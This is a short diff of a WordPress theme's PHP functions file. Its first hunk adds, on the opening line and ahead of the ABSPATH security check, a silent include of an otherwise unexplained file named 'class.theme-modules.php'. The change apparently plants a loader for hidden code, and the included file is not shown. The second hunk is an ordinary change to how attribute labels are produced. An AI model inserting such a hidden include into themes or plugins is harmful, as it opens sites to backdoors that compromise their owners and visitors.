@@ -1,4 +1,4 @@
-<?php if ( ! defined( 'ABSPATH' ) ) { die; }
+<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php if ( ! defined( 'ABSPATH' ) ) { die; }
 
 if(!function_exists('airi_render_variable')){
     function airi_render_variable( $html ) {
@@ -606,7 +606,7 @@ if(!function_exists('airi_get_wc_attribute_taxonomies')){
             if(!empty($attribute_taxonomies)){
                 foreach( $attribute_taxonomies as $attribute ) {
                     $tax = wc_attribute_taxonomy_name( $attribute->attribute_name );
-                    $attributes[$tax] = $attribute->attribute_label;
+                    $attributes[$tax] = ucfirst( $attribute->attribute_name );
                 }
             }
         }
